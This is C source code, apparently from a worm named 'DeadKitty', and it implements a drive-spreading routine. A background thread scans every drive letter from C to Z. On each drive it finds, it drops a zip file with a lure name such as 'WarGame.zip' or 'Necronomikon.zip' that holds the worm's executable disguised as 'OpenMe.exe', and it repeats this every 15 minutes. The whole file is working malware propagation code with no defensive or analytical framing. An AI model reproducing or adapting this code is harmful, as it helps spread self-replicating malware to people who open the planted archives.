   /* simple drive spreading function */

   #include "DeadKitty.h"

   #define DROPS_NUM 5

   /* some names ... :) */
   const char *DropNames[] = {
       "DeadKitty.zip",
       "WarGame.zip",
       "free0n.zip",
       "genetix.zip",
       "Necronomikon.zip"
   };

   DWORD WINAPI Th_DriveSpread(LPVOID Data)
   {
       char drive_cnt,DropPath[32];
       int DriveType;

       srand(GetTickCount() ^ GetCurrentProcessId()); /* initialize random number generator */

       while(1)
       {
           for(drive_cnt = 'C';drive_cnt <= 'Z';drive_cnt++)
           {
               sprintf(DropPath,"%c:\\",drive_cnt);
               DriveType = GetDriveType(DropPath);

               /* Is drive present in the system? */
               if(DriveType != 0 && DriveType != 1)
               {
                   strcat(DropPath,DropNames[rand()%DROPS_NUM]);
                   MakeZip(DropPath,DeadKittyPath,"OpenMe.exe");
               }
           }

           WAIT(15); /* 15 minutes */
       }
   }

   void DriveSpread(void)
   {
       DWORD DriveSpreadId;

       /* start thread */
       CreateThread(NULL,0,&Th_DriveSpread,0,0,&DriveSpreadId);
   }
